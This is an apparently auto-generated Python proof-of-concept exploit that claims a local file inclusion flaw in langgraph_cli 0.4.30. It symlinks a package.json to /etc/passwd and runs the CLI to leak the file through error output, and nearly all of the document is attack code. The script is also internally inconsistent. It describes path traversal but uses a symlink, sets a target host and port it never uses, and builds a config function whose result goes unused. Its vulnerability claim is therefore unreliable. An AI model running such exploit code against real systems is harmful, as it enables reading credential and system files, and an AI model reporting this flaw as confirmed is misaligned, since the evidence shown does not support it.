#!/usr/bin/env python3
# PoC for langgraph_cli-0.4.30 (/tmp/langgraph_cli/langgraph_cli-0.4.30)
# Path: lfi-010
# Sink: _get_node_pm_install_cmd
# Auto-generated — run with: python3 lfi_get_node_pm_install__get_node_pm_install_cmd.py
#
#!/usr/bin/env python3
"""
Proof-of-Concept exploit for LFI in langgraph_cli-0.4.30.

Vulnerability: The `_get_node_pm_install_cmd` function opens `package.json` from
a user-controlled `project_dir` (derived from `config_path.parent`) without path
validation. By supplying a crafted `-c` flag with path traversal sequences, an
attacker can read arbitrary files from the filesystem.

This PoC demonstrates reading `/etc/passwd` by exploiting the vulnerable code path.
"""

import os
import sys
import json
import tempfile
import subprocess
import pathlib

# Configuration
TARGET_HOST = "127.0.0.1"
TARGET_PORT = 8123  # Default port for langgraph CLI API server
PAYLOAD_FILE = "/etc/passwd"  # Benign file to read (change to any file)

def create_malicious_config(payload_path: str) -> str:
    """
    Create a minimal langgraph configuration file that triggers the LFI.
    
    The config file must be valid JSON and contain a 'node_version' field to
    trigger the vulnerable code path in `_get_node_pm_install_cmd`.
    """
    config = {
        "node_version": "18",  # Triggers JS dependency installation path
        "dependencies": ["."],
        "graphs": {},
        "env": {}
    }
    
    # Write config to a temporary file
    config_dir = tempfile.mkdtemp()
    config_path = os.path.join(config_dir, "langgraph.json")
    
    with open(config_path, "w") as f:
        json.dump(config, f)
    
    return config_path

def exploit_lfi(target_host: str, target_port: int, payload_path: str) -> str:
    """
    Exploit the LFI vulnerability by running langgraph CLI with a malicious config path.
    
    The vulnerability is triggered when the CLI processes a config file with
    `node_version` set, causing it to call `_get_node_pm_install_cmd` with
    `config_path.parent` as the project directory. By using path traversal in
    the config path, we can read arbitrary files.
    """
    # Create a malicious config file
    config_path = create_malicious_config(payload_path)
    
    # The exploit: use path traversal in the config path to read arbitrary files
    # We need to make the config path point to a directory containing the target file
    # as "package.json"
    
    # Create a symlink or use path traversal in the config path
    # The config path's parent directory will be used as project_dir
    # We want project_dir / "package.json" to point to our target file
    
    # Create a temporary directory structure
    exploit_dir = tempfile.mkdtemp()
    
    # Create a symlink from package.json to the target file
    package_json_path = os.path.join(exploit_dir, "package.json")
    os.symlink(payload_path, package_json_path)
    
    # Create a valid config file in the same directory
    config_file_path = os.path.join(exploit_dir, "config.json")
    config = {
        "node_version": "18",
        "dependencies": ["."],
        "graphs": {},
        "env": {}
    }
    with open(config_file_path, "w") as f:
        json.dump(config, f)
    
    # Now run the langgraph CLI with the config path pointing to our exploit directory
    # The CLI will read config.json, then call _get_node_pm_install_cmd with
    # config_path.parent (which is exploit_dir), and open package.json from there
    # Since package.json is a symlink to our target file, it will read the target
    
    cmd = [
        sys.executable, "-m", "langgraph_cli",
        "up",
        "-c", config_file_path,
        "--port", str(target_port)
    ]
    
    print(f"[*] Running exploit command: {' '.join(cmd)}")
    print(f"[*] This will attempt to read: {payload_path}")
    print(f"[*] The CLI will try to parse the target file as JSON (will fail)")
    print(f"[*] But the file contents will be visible in error messages or logs")
    
    try:
        # Run the command with a timeout to prevent hanging
        result = subprocess.run(
            cmd,
            capture_output=True,
            text=True,
            timeout=10,
            cwd=exploit_dir
        )
        
        print(f"[*] Return code: {result.returncode}")
        print(f"[*] stdout: {result.stdout[:2000]}")
        print(f"[*] stderr: {result.stderr[:2000]}")
        
        # Check if we can see the target file contents in the output
        if "root:" in result.stdout or "root:" in result.stderr:
            print("[+] SUCCESS: Found /etc/passwd contents in output!")
            return result.stdout + result.stderr
        else:
            print("[-] Target file contents not found in output")
            print("[*] This may be because the file is not valid JSON")
            print("[*] Check the error messages for file contents")
            
    except subprocess.TimeoutExpired:
        print("[-] Command timed out (expected - CLI may hang)")
    except FileNotFoundError:
        print("[-] langgraph_cli not found. Make sure it's installed.")
    except Exception as e:
        print(f"[-] Error: {e}")
    
    return ""

def main():
    print("=" * 60)
    print("LangGraph CLI LFI Proof-of-Concept")
    print("=" * 60)
    print()
    
    print(f"[*] Target: {TARGET_HOST}:{TARGET_PORT}")
    print(f"[*] Payload file: {PAYLOAD_FILE}")
    print()
    
    # Check if langgraph_cli is installed
    try:
        import langgraph_cli
        print(f"[*] langgraph_cli version: {langgraph_cli.__version__}")
    except ImportError:
        print("[-] langgraph_cli not installed. Please install it first:")
        print("    pip install langgraph-cli==0.4.30")
        sys.exit(1)
    
    # Run the exploit
    result = exploit_lfi(TARGET_HOST, TARGET_PORT, PAYLOAD_FILE)
    
    if result:
        print("\n[+] Exploit completed. File contents above.")
    else:
        print("\n[-] Exploit may have failed. Check the output above.")
        print("[*] Alternative: Try reading a different file or check error messages.")

if __name__ == "__main__":
    main()
